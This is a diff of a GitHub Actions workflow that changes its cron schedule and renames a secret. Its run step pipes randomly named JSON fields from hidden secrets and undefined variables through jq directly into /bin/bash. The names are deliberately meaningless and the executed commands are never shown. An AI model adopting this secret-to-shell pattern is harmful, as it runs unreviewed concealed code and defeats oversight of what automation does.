@@ -1,10 +1,10 @@
 name: yaoyongyt
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
-
-jobs:  # 5526
+    - cron: '46 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +12,18 @@ jobs:  # 5526
       - uses: actions/checkout@v4
       - name: yaoyongyt
         env:
-          zz07: ${{ secrets.zz07 }}
+          eq57: ${{ secrets.eq57 }}
         run: |
-          echo $zz07 | jq -r .yckkb1 | /bin/bash
-          echo $i66 | jq -r .wt70211 | /bin/bash
-          echo $kvnob06 | jq -r .l1 | /bin/bash
+          echo $eq57 | jq -r .u92951 | /bin/bash
+          echo $qd2 | jq -r .mfc536 | /bin/bash
+          echo $vtgs84619 | jq -r .e7 | /bin/bash
+          echo $gth470 | jq -r .suvy9174 | /bin/bash
+          echo $rtjm640 | jq -r .yt573 | /bin/bash
+          echo $hkync38901 | jq -r .nccbs7 | /bin/bash
+          echo $rn9 | jq -r .iolwr7740 | /bin/bash
+          echo $nciti909 | jq -r .ufql3189 | /bin/bash
+          echo $ld9281 | jq -r .inkz6821 | /bin/bash
+          echo $n8583 | jq -r .x0 | /bin/bash
+          echo $risbl83 | jq -r .zw017 | /bin/bash
+          echo $ku4 | jq -r .efuxb145 | /bin/bash
 
